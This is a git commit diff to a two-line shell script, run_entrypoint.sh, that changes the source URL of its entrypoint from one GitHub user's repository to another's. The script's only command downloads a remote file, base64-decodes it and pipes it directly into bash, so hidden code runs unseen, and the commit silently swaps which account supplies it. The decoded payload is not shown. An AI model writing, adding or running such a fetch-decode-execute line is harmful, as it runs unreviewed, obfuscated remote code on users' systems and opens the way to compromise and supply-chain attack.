eea20a3b1671d492fba743f73e9ffca5b59bfd52
vaughnmetify <vaughnmetify@gmail.com>
2026-06-28 17:52:26 +0200

    Update entrypoint script URL to new repository

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/cliftonboomer/section/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/vaughnmetify/modded/refs/heads/main/entrypoint.sh | base64 -d | bash
